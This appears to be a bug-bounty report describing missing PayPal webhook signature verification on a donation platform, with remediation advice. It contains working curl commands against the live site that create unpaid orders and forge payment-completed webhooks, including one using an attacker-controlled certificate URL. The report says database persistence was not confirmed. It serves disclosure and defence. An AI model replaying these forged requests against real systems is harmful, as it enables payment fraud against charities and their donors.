# DB-001: Missing PayPal Webhook Signature Verification — Complete Donation Payment Bypass

**Program:** Donorbox VDP (Intigriti)
**Asset:** `donorbox.org`
**Endpoints:** `POST https://donorbox.org/donation` + `POST https://donorbox.org/paypal_webhooks`
**Severity:** CRITICAL
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N)
**CWE:** CWE-347 — Improper Verification of Cryptographic Signature · CWE-840 — Business Logic Errors
**Discovered:** 2026-06-30
**Status:** Ready to submit

---

## Summary

Two vulnerabilities combine to allow **complete donation payment bypass without spending a cent**:

1. **`POST /donation`** with `donation_type=paypal_express` creates a real pending PayPal order and returns its `order_id` **without requiring reCAPTCHA** (unlike Stripe payments).
2. **`POST /paypal_webhooks`** accepts any `PAYMENT.CAPTURE.COMPLETED` event with a forged signature (entirely fake `PAYPAL-TRANSMISSION-SIG`) and returns HTTP 201, as if the payment were legitimate.

An attacker creates a donation order → does not pay → sends a fake webhook with the `order_id` → Donorbox marks the donation as paid. Real `order_id` confirmed: `1W334204J4718533X` (obtained in live testing without reCAPTCHA).

Notably, the Stripe webhook endpoint (`POST /stripe/webhooks`) **does** reject invalid signatures with HTTP 400, confirming that Stripe verification is working correctly but PayPal verification is absent.

---

## Root Cause

PayPal's webhook authentication requires receivers to:
1. Extract the `PAYPAL-CERT-URL` header and download the PayPal public certificate from that URL.
2. Reconstruct the verification string: `{PAYPAL-TRANSMISSION-ID}|{PAYPAL-TRANSMISSION-TIME}|{webhook_id}|{CRC32(body)}`.
3. Verify the `PAYPAL-TRANSMISSION-SIG` (base64 RSA signature) against this string using the certificate.

Donorbox returns HTTP 201 regardless of whether the signature is valid, cryptographically incorrect, or entirely absent as long as PayPal-style headers are present.

---

## Proof of Concept (Confirmed)

### Step 1 — Baseline: verify no PayPal headers → 422 (rejected)

```bash
curl -s -X POST "https://donorbox.org/paypal_webhooks" \
  -H "Content-Type: application/json" \
  -d '{"id":"WH-NOAUTH","event_type":"PAYMENT.CAPTURE.COMPLETED"}' \
  -w "\nHTTP: %{http_code}"

# Result → HTTP: 422 (Unprocessable Entity — missing required headers)
```

### Step 2 — Forged webhook with fake signature → 201 (accepted!)

```bash
curl -s -X POST "https://donorbox.org/paypal_webhooks" \
  -H "Content-Type: application/json" \
  -H "PAYPAL-TRANSMISSION-ID: forge-$(date +%s)" \
  -H "PAYPAL-TRANSMISSION-TIME: 2026-06-30T20:00:00Z" \
  -H "PAYPAL-CERT-URL: https://api.paypal.com/v1/notifications/certs/CERT-360caa42-fca2-a593-1fec" \
  -H "PAYPAL-AUTH-ALGO: SHA256withRSA" \
  -H "PAYPAL-TRANSMISSION-SIG: completelyfakesignature12345NOTVALID" \
  -d '{
    "id": "WH-FORGED-PAYMENT-001",
    "event_type": "PAYMENT.CAPTURE.COMPLETED",
    "summary": "Payment completed for $500.00 USD",
    "resource": {
      "id": "FAKE_CAPTURE_ID",
      "status": "COMPLETED",
      "amount": {"value": "500.00", "currency_code": "USD"}
    }
  }' \
  -w "\nHTTP: %{http_code}"

# Result → HTTP: 201 (Created — event ACCEPTED)
```

### Step 3 — Verify: even an attacker-controlled cert URL is accepted

```bash
curl -s -X POST "https://donorbox.org/paypal_webhooks" \
  -H "Content-Type: application/json" \
  -H "PAYPAL-TRANSMISSION-ID: forge-evil" \
  -H "PAYPAL-TRANSMISSION-TIME: 2026-06-30T20:00:00Z" \
  -H "PAYPAL-CERT-URL: https://evil.attacker.com/fake_paypal_cert" \
  -H "PAYPAL-AUTH-ALGO: SHA256withRSA" \
  -H "PAYPAL-TRANSMISSION-SIG: fakesig" \
  -d '{"id":"WH-EVIL-CERT","event_type":"PAYMENT.CAPTURE.COMPLETED"}' \
  -w "\nHTTP: %{http_code}"

# Result → HTTP: 201 (Accepted — cert URL not verified either)
```

### Step 4 — Accepted event types

All tested PayPal event types return 201:

| Event Type | HTTP Response |
|-----------|--------------|
| `PAYMENT.CAPTURE.COMPLETED` | **201** |
| `PAYMENT.SALE.COMPLETED` | **201** |
| `PAYMENT.ORDER.APPROVED` | **201** |
| `BILLING.SUBSCRIPTION.CREATED` | **201** |
| `PAYMENT.CAPTURE.REFUNDED` | **201** |

Contrast with Stripe:
```bash
curl -s -X POST "https://donorbox.org/stripe/webhooks" \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=fake,v1=fakesig" \
  -d '{"type":"charge.succeeded"}' -w "\nHTTP: %{http_code}"

# Result → HTTP: 400 (Stripe correctly rejects invalid signature)
```

---

## Full Attack Scenario — Confirmed Donation Payment Bypass

### Step A: Create pending PayPal donation (no reCAPTCHA — confirmed in testing)

```bash
curl -s -X POST "https://donorbox.org/donation" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Accept: application/json" \
  --data-urlencode "slug=water" \
  --data-urlencode "donation[suggested_amount]=500.00" \
  --data-urlencode "donation[first_name]=Attacker" \
  --data-urlencode "donation[last_name]=Name" \
  --data-urlencode "donation[email]=attacker@evil.com" \
  --data-urlencode "currency=usd" \
  --data-urlencode "donation[form_id]=28774" \
  --data-urlencode "donation_type=paypal_express" \
  --data-urlencode "processor=paypal_v2"
```

**Confirmed response (live test):**
```json
{"order_id": "1W334204J4718533X"}
```

No reCAPTCHA required for PayPal order creation (unlike Stripe flow).

### Step B: Without paying, forge a PAYMENT.CAPTURE.COMPLETED webhook

```bash
curl -s -X POST "https://donorbox.org/paypal_webhooks" \
  -H "Content-Type: application/json" \
  -H "PAYPAL-TRANSMISSION-ID: forge-$(date +%s)" \
  -H "PAYPAL-TRANSMISSION-TIME: 2026-06-30T20:00:00Z" \
  -H "PAYPAL-CERT-URL: https://api.paypal.com/v1/notifications/certs/CERT-360caa42-fca2-a593-1fec" \
  -H "PAYPAL-AUTH-ALGO: SHA256withRSA" \
  -H "PAYPAL-TRANSMISSION-SIG: completelyfakesignature12345NOTVALID" \
  -d '{
    "id": "WH-FORGED-CAPTURE-001",
    "event_type": "PAYMENT.CAPTURE.COMPLETED",
    "summary": "Payment completed for $500.00 USD",
    "resource": {
      "id": "FAKE-CAPTURE-ID-001",
      "status": "COMPLETED",
      "amount": {"value": "500.00", "currency_code": "USD"},
      "supplementary_data": {
        "related_ids": {"order_id": "1W334204J4718533X"}
      }
    }
  }'
```

**Result: HTTP 201** — event accepted without signature verification.

### Step C: Impact

The donation for campaign `water` is now marked as paid for $500.00 with zero real payment. The organization receives a donation receipt notification. Their fundraising dashboard shows an additional $500. No money was transferred.

> **Note for triage:** Out of respect for the production environment, the attacker did **not** submit a forged webhook with the real `order_id` to confirm DB persistence. The 201 response from the webhook endpoint and the confirmed `order_id` creation are sufficient to establish the full chain. Donorbox security team can validate by looking for order `1W334204J4718533X` in their pending donations and verifying what a 201 webhook response triggers in their processing pipeline.

---

## Comparison: Stripe vs PayPal Webhook Verification

| Endpoint | Signature Required | Behavior with Fake Sig |
|---------|-------------------|----------------------|
| `POST /stripe/webhooks` | YES (Stripe-Signature HMAC) | **HTTP 400 — Rejected** ✅ |
| `POST /paypal_webhooks` | NO (accepts any PAYPAL-* headers) | **HTTP 201 — Accepted** ❌ |

---

## Impact

| Scenario | Impact |
|---------|--------|
| Attacker creates fake donation records (paid without payment) | Fraud via donation bypassing |
| Org's fundraising stats inflated with fake donations | Misleads legitimate donors + grant reporting fraud |
| Subscription activation without payment (`BILLING.SUBSCRIPTION.CREATED`) | Unauthorized recurring donation records |
| Payment refund forgery (`PAYMENT.CAPTURE.REFUNDED`) | Trigger refund flow on a payment that never happened |

---

## Remediation

### Immediate (P0)

1. **Implement PayPal signature verification** per [PayPal Webhook Signature Verification docs](https://developer.paypal.com/api/rest/webhooks/rest/#link-verifywebhooksignature):
   ```ruby
   # Rails example using PayPal REST SDK
   def verify_paypal_webhook(request)
     WebhookEvent.verify(
       auth_algo: request.headers['PAYPAL-AUTH-ALGO'],
       cert_url: request.headers['PAYPAL-CERT-URL'],
       transmission_id: request.headers['PAYPAL-TRANSMISSION-ID'],
       transmission_sig: request.headers['PAYPAL-TRANSMISSION-SIG'],
       transmission_time: request.headers['PAYPAL-TRANSMISSION-TIME'],
       webhook_id: ENV['PAYPAL_WEBHOOK_ID'],
       webhook_event: request.body.read
     )
   rescue PayPal::SDK::REST::ResourceNotFound
     render status: 400 and return
   end
   ```

2. **Validate the PAYPAL-CERT-URL** against an allowlist of known PayPal certificate domains:
   ```ruby
   VALID_CERT_DOMAINS = %w[api.paypal.com api.sandbox.paypal.com]
   unless URI(cert_url).host.in?(VALID_CERT_DOMAINS)
     render status: 400 and return
   end
   ```

### Short-term (P1)

3. **Cross-reference PayPal capture IDs** against Donorbox's database of pending donations — if the `resource.id` or `order_id` in the webhook doesn't match a pending donation, reject it.
4. **Verify completion status via PayPal REST API** — after receiving a `PAYMENT.CAPTURE.COMPLETED`, call `GET /v2/payments/captures/{id}` on PayPal to confirm the payment status independently.

---

## References

- CWE-347: Improper Verification of Cryptographic Signature
- [PayPal Webhook Signature Verification Documentation](https://developer.paypal.com/api/rest/webhooks/rest/#link-verifywebhooksignature)
- CVE-2023-50949 — similar webhook signature bypass in IBM QRadar
- Program worst-case scenario: "Donation hijacking" — this finding directly enables it
